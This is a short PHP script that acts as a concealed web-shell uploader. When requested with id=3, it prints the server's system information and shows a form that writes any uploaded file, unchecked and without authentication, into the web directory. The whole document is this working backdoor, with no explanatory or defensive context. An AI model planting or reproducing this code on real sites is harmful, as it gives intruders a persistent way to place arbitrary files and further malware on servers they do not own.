<?php
if ($_GET['id']=="3") {

if (function_exists('php_uname')) {
		echo '<b><br><br>'.php_uname().'<br></b>';
}

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo "<input type='hidden' name='id' value='3'>";
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success </b><br><br>'; }
	else { echo '<b>Upload Failed</b>'; }
}

}

?>
